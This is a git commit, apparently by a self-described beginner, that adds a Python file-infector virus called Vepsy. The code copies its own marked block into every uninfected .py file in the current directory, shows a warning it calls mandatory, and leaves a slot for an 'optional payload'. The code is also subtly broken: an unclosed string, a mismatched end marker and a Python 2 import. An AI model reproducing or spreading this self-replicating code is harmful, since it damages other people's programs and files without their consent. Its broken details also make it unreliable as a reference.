c9cb9e448fb2fac511e00f82644f9bed23672804
Echo <108100601+whoisecho@users.noreply.github.com>
2022-08-14 21:47:40 +0100

    Vepsy Testing Virus
    LIKE I SAID, I AM A BEGINNER CODER WITH NO EXPERIENCE, THIS VIRUS MAY LAG YOUR COMPUTER. This virus will run when you use python on it, it does have a warning screen but it wont give you any choice.

---
+++ vepsytest.py
@@ -0,0 +1,41 @@
+##### VEPSY START #####
+import sys, glob, re, tkMessageBox
+
+tkMessageBox.showinfo(title="WARNING", message="You are about to run Vepsy. This is a virus, and the owner is not responsible for any damages caused. USE IN VM!)
+
+#get copy of Vepsy
+vCode = []
+fh = open(sys.argv[0], "r")
+lines = fh.readlines()
+fh.close()
+inVirus = False
+for line in lines:
+    if (re.search('^##### VEPSY START #####', line)): inVirus = True
+    if (inVirus): vCode.append(line)
+    if (re.search('^##### VEPSY END #####', line)): break
+
+#find victims
+progs = glob.glob("*.py")
+
+#check and infect
+for prog in progs:
+    fh = open(prog, "r")
+    pCode = fh.readlines()
+    fh.close()
+    infected = False
+    for line in pCode:
+        if ('##### VEPSY START #####' in line):
+            infected = True
+            break
+    if not infected:
+        newCode = []
+        if ('#!' in pCode[0]): newCode.append(pCode.pop(0))
+        newCode.extend(vCode)
+        newCode.extend(pCode)
+        #Writing new vepsy infected code
+        fh = open(prog, "w")
+        fh.writelines(newCode)
+        fh.close()
+#optional payload
+
+#####VEPSY END #####
